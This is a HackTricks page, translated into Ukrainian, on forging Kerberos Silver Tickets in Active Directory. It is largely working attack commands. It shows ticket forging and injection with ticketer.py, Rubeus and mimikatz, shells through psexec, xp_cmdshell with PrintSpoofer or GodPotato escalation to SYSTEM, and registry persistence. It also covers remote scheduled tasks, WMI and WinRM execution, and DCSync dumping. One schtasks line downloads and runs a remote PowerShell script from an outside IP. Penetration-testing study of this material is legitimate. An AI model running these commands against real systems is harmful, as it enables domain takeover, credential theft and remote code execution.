# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** передбачає експлуатацію service tickets в середовищах Active Directory (AD). Цей метод базується на **acquiring the NTLM hash of a service account**, наприклад computer account, для підробки Ticket Granting Service (TGS) ticket. З таким підробленим квитком атакуючий може отримати доступ до конкретних сервісів у мережі, **impersonating any user**, зазвичай прагнучи отримати адміністративні привілеї. Підкреслюється, що використання AES keys для підробки квитків є більш безпечним і менш помітним.

> [!WARNING]
> Silver Tickets менш помітні, ніж Golden Tickets, оскільки вони потребують лише **hash of the service account**, а не krbtgt account. Однак вони обмежені конкретним сервісом, на який спрямовані. Крім того, достатньо просто вкрасти пароль користувача.
> Якщо ви скомпрометували **account's password with a SPN**, ви можете використати цей пароль для створення Silver Ticket, що impersonating any user до цього сервісу.

Для створення квитків (ticket crafting) використовуються різні інструменти залежно від операційної системи:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### У Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Сервіс CIFS підкреслюється як поширена ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можна експлуатувати для виконання завдань та WMI-запитів.

### Приклад: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Якщо у вас є NTLM-хеш (або AES-ключ) облікового запису сервісу SQL (наприклад, sqlsvc), ви можете підробити TGS для MSSQL SPN і impersonate будь-якого користувача для SQL service. Далі увімкніть xp_cmdshell, щоб виконувати команди від імені облікового запису сервісу SQL. Якщо цей токен має SeImpersonatePrivilege, використайте Potato для ескалації до SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Якщо отриманий контекст має SeImpersonatePrivilege (зазвичай для service accounts), використайте варіант Potato, щоб отримати SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Детальніше про зловживання MSSQL та увімкнення xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Огляд Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Доступні сервіси

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використавши параметр:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets — Ідентифікатори подій

- 4624: Успішний вхід облікового запису
- 4634: Вихід з облікового запису
- 4672: Адміністраторський вхід

## Персистентність

Щоб уникнути того, щоб машини змінювали пароль кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або можна встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на значення більше ніж 30days, щоб вказати період ротації, коли пароль машини має бути змінений.

## Зловживання сервісними квитками

У наведених прикладах уявімо, що квиток отримано шляхом імітації облікового запису адміністратора.

### CIFS

З цим квитком ви зможете отримати доступ до папок `C$` та `ADMIN$` через **SMB** (якщо вони відкриті) та скопіювати файли в частину віддаленої файлової системи, просто зробивши щось на кшталт:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ви також зможете отримати shell усередині host або виконувати довільні команди за допомогою **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

З цим дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

За допомогою цих квитків ви можете **виконувати WMI у системі жертви**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Знайдіть **більше інформації про wmiexec** на наступній сторінці:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### ХОСТ + WSMAN (WINRM)

Маючи доступ по winrm до комп'ютера, ви можете **підключитися до нього** та навіть отримати PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Перегляньте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зверніть увагу, що **winrm має бути активним і прослуховувати** на віддаленому комп'ютері, щоб отримати до нього доступ.

### LDAP

Маючи це право, ви можете отримати дамп бази даних DC за допомогою **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Дізнайтеся більше про DCSync** на наступній сторінці:


{{#ref}}
dcsync.md
{{#endref}}


## Джерела

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
